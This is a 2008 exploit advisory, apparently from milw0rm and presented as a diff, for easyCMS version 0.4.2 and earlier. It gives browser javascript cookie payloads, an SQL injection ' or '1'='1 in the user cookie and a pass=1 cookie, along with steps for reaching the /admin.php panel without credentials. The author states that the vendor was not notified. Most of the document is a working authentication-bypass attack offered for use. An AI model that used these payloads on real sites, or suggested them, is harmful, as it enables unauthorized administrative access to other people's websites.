@@ -1,0 +1,67 @@
+--==+================================================================================+==--
+--==+		      easyCMS <= 0.4.2 Multiple Remote Vulnerabilitys  	             +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 17 MAY 2008
+Script Download: http://ecomansys.sourceforge.net/
+DORK: N/A
+
+
+
+Vendor Has Not Been Notified!
+
+
+
+DESCRIPTION: 
+
+eCMS (all versions avalible) suffers from multiple remote vulnerabilitys.
+
+these include, Insecure Cookie Handling, SQL Injection. the version <= 0.2 allows a admin cookie to be set and
+grant full access to the admin area.
+
+versions => 0.2 allows a simple sql statement to be inserted into the cookie bypassing the admin login.
+
+see below for the vulnerabilitys.
+
+
+
+SQL Injection (version => 0.2):
+
+javascript:document.cookie = "user=' or '1'='1; path=/";
+javascript:document.cookie = "pass=admin; path=/";
+
+before running the above javascript in your browser, replace "admin" with the actual admin username.
+most of the time "admin" should work. after running both javascripts on the affected website.
+you can visit "/admin.php" to view admin panel.
+
+
+
+Insecure Cookie Handling (version <= 0.2):
+
+javascript:document.cookie = "pass=1; path=/";
+
+running the above javascript on a eCMS version <= 0.2 will grant admin access, after running visit "/admin.php"
+
+
+
+NOTE/TIP: 
+
+no dork, since people replace the dork in "config.php"
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+
+peace, t0pP8uZz
+
+
+
+--==+================================================================================+==--
+--==+		      easyCMS <= 0.4.2 Multiple Remote Vulnerabilitys  	             +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-05-18]
